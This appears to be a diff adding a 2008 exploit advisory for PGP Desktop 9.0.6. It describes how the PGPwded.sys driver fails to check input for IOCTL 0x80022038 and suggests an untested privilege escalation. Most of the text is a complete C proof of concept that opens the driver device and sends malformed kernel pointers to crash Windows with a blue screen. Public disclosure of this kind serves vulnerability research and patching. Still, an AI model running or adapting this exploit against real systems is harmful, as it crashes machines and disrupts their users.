@@ -1,0 +1,105 @@
+--------------------------[PGP Desktop 9.0.6 Denial Of Service]--------------->
+
+
+Author: Giuseppe 'Evilcry' Bonfa'
+E-Mail: evilcry {AT} GMAIL {DOT} COM
+Profile: http://evilcry.netsons.org
+Website: http://evilfingers.com/
+
+Release Date: 23/12/2008
+
++-------------------------------------------------+
+Product: PGP Desktop 9.0.6 [Build 6060] (other version could be affected)
+Affected Component: PGPwded.sys
+Category: Local Denial of Service (BSOD)
+          (untested) Local Privilege Escalation
++-------------------------------------------------+
+
+
+
+--------------------------[Details]--------------->
+
+PGP Desktop 's PGPweded.sys Driver does not sanitize user supplied input (IOCTL)
+and this lead to a Driver Collapse that propagates on the system with a BSOD.
+
+Affected IOCTL is 0x80022038
+
++-------------------------------------------------+
+ Device Type: Custom Device Type: 0x8002, 32770
+ Transfer Type: METHOD_BUFFERED (0x0, 0)
+ Access Type: FILE_ANY_ACCESS (0x0, 0)
+ Function Code: 0x80E, 2062
++-------------------------------------------------+
+
+From Crash Dump Analysis we obtain a KERNEL_MODE_EXCEPTION_NOT_HANDLED (8e),
+could also exists the possibility of a Local Privilege Escalation, but I've not
+checked it =)
+
++--------------------------------------------------------------------------------------------+
+/* PGPwded.sys KERNEL_MODE_EXCEPTION_NOT_HANDLED - DoS PoC
+ * 
+ * Author: Giuseppe 'Evilcry' Bonfa'
+ * E-Mail: evilcry {AT} gmail. {DOT} com
+ * Website: http://evilcry.netsons.org
+ *
+ */
+
+/* 
+Since we had publishing problems, we used spaces between escape < char and the include file as shown here: #include < windows.h >, to compile you have to delete the space.
+
+*/
+#include < windows.h >
+#include < stdio.h >
+#include < stdlib.h >
+
+int main(void)
+{
+	HANDLE hDevice;	
+	DWORD Dummy;	
+	
+	system("cls");
+	printf("\n .:: PGP Enterprise DoS Proof of Concept ::.\n");
+
+	hDevice = CreateFileA("\\\\.\\PGPwdef",
+						0,
+						FILE_SHARE_READ | FILE_SHARE_WRITE,
+						NULL,
+						OPEN_EXISTING,
+						0,
+						NULL);
+
+	if (hDevice == INVALID_HANDLE_VALUE)
+	{
+		printf("\n Unable to Open PGPwded Device Driver\n");
+		return EXIT_FAILURE;
+	}
+
+	DeviceIoControl(hDevice, 0x80022038,(LPVOID) 0x80000001, 0, (LPVOID) 0x80000002, 0, &Dummy, (LPOVERLAPPED)NULL);
+
+	return EXIT_SUCCESS;
+}
+
++--------------------------------------------------------------------------------------------+
+
+
+
+Special Thanks:
+To _g_ of orange-bat that developed IOCTL-Proxy a really effective IOCTL Fuzzer
+http://www.orange-bat.com/code/ioctl-proxy.zip
+
+
+
+Regards,
+Giuseppe 'Evilcry' Bonfa'
+
+
+
+Disclaimer:
+The information in the advisory is believed to be accurate at the time of publishing based 
+on currently available information. Use of the information constitutes acceptance for use 
+in an AS IS condition. There is no representation or warranties, either express or implied 
+by or with respect to anything in this document, and shall not be liable for a ny implied 
+warranties of merchantability or fitness for a particular purpose or for any indirect special 
+or consequential damages.
+
+# milw0rm.com [2008-12-23]
